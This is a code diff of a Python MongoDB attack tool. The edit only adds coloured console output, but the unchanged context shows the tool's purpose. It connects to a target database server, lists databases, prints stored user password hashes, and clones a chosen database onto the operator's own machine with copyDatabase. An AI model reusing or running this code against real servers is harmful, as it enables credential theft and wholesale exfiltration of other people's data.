@@ -2,6 +2,7 @@
 # __author__: sixwhale
 from pymongo import MongoClient
 from globalvalue import GlobalValue
+from colorama import Fore, Back, Style, init
 
 no_tag = GlobalValue.no_tag
 yes_tag = GlobalValue.yes_tag
@@ -18,14 +19,14 @@ def mgAttack(ip,port,myip,myport,clone_info=[0,None]):
         mongoOpen = True
     elif needCreds[0] == 1:
         print '[*] login required......'
-        DBuser = raw_input('Username: ')
-        DBpwd = raw_input('Password: ')
+        DBuser = raw_input(Fore.CYAN + 'Username: ')
+        DBpwd = raw_input(Fore.CYAN + 'Password: ')
     elif needCreds[0] == 2:
         conn = MongoClient(ip,port)
         print '[*] access check failure. Testing will continute but will be unreliable.'
         mongoOpen = True
     elif needCreds[0] == 3:
-        print '[Error] couldn\'t connect to MongoDB server.'
+        print(Fore.RED + '[Error] couldn\'t connect to MongoDB server.')
 
     if mongoOpen == True:
         displayInfo(conn) #显示数据库信息
@@ -47,7 +48,7 @@ def displayDBS(conn):
             print '    %s' % db
         print '\n'
     except:
-        print '[Error] Couldn\'t list databases.'
+        print(Fore.RED + '[Error] Couldn\'t list databases.')
     try:
         for dbname in conn.database_names():
             db = conn[dbname]
@@ -67,10 +68,10 @@ def displayDBS(conn):
                         print "    Hash: " + users[x]['pwd']
                         print "\n"
                 except Exception, e:
-                    print '[Error] %s, couldn\'t list user or hash\n' % e
+                    print(Fore.RED + '[Error] %s, couldn\'t list user or hash\n' % e)
                     continue
     except Exception, e:
-        print '[Error] %s, Couldn\'t list collections.\n' % e
+        print(Fore.RED + '[Error] %s, Couldn\'t list collections.\n' % e)
 
 def mongoScan(ip,port):
     try:
@@ -91,25 +92,24 @@ def mongoScan(ip,port):
 def cloneDB(conn,myip,myport,clone_db,ip):
     dbList = conn.database_names()
     if len(dbList) == 0:
-        print '[Error] couldn\'t get a list of databases to clone.'
+        print(Fore.RED + '[Error] couldn\'t get a list of databases to clone.')
     elif clone_db in dbList:
             try:
-                dbNeedCreds = raw_input('[*] Does this Database require credentials.(y/n)?')
+                dbNeedCreds = raw_input(Fore.CYAN + '[*] Does this Database require credentials.(y/n)?')
                 myDBconn = MongoClient(myip,myport)
                 if dbNeedCreds in no_tag:
                     myDBconn.copyDatabase(clone_db,clone_db+'_clone',ip)
                 elif dbNeedCreds in yes_tag:
-                    user = raw_input('Username: ')
-                    pwd = raw_input('Password: ')
+                    user = raw_input(Fore.CYAN + 'Username: ')
+                    pwd = raw_input(Fore.CYAN + 'Password: ')
                     myDBconn.copyDatabase(clone_db,clone_db+'clone',ip,user,pwd)
                 else:
-                    raw_input('[*] Invalid Selection. Press enter to continue!')
+                    raw_input(Fore.CYAN + '[*] Invalid Selection. Press enter to continue!')
                     cloneDB(conn,myip,myport,clone_db,ip)
             except Exception, e:
-                print '[Error]: '+str(e),
                 if str(e).find('Connection refused'):
-                    print ' Make sure that mongoDB has been installed or that mongoDB is opened on this computer.'
+                    print(Fore.RED + '[Error] %s. Make sure that mongoDB has been installed or that mongoDB is opened on this computer.' % e)
                 elif str(e).find('text search not enabled'):
-                    print ' Database copied, but text indexing was not enabled on the target.'
+                    print(Fore.RED + '[Error] %s. Database copied, but text indexing was not enabled on the target.' % e)
                 else:
-                    print ' Something went wrong.'
+                    print(Fore.RED + '[Error] %s. Something went wrong.' % e)
